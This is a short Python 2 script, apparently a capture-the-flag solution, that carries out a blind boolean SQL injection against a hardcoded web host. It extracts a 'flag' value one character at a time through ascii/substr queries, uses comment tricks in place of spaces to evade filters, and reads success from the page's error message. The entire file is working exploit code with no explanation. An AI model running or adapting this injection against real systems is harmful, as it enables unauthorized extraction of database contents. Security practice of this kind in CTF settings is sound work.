import requests

dicts = 'abcdefghijklmnopqrstuvwxyz0123456789{}'

flag = ''

for x in xrange(1,50):
    for i in dicts:
        url = 'http://106.12.37.37:8080/level2/?userid=(ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d)&token=21232f297a57a5a743894a0e4a801fc3&password=1' %(x,ord(i))
        try:
            response = requests.get(url,timeout = 5)
            if response.content.find('error password!') != -1:
                flag = flag + i
                print flag
                break
        except Exception,e:
                pass
           
print flag

           

            
